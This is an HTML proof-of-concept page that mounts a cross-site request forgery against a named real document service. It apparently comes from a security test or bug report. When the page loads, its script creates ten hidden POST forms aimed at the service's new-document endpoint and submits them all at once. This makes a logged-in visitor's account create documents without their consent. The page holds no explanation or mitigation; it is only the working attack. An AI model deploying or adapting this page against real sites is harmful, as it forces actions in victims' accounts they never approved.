<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Parallel Form Submission</title>
</head>
<body>
<div id="formsContainer"></div>

<script>
    const maxDocsToCreate = 10;
    const targetUrl = "https://docs.superhuman.com/newdoc/CSRF_PoC_Create_New_Document_In_My_Docs_folder";
    
    // Create all forms
    const formsContainer = document.getElementById('formsContainer');
    const forms = [];
    
    for (let i = 0; i < maxDocsToCreate; i++) {
        const form = document.createElement('form');
        form.id = `csrfForm_${i}`;
        form.action = targetUrl;
        form.method = 'POST';
        form.style.display = 'none';
        formsContainer.appendChild(form);
        forms.push(form);
    }
    
    // Submit all forms in parallel
    function submitAllFormsParallel() {
        forms.forEach((form, index) => {
            // Use setTimeout with 0ms to ensure async execution
            setTimeout(() => {
                form.submit();
            }, 0);
        });
    }
    
    // Execute on page load
    submitAllFormsParallel();
</script>
</body>
</html>
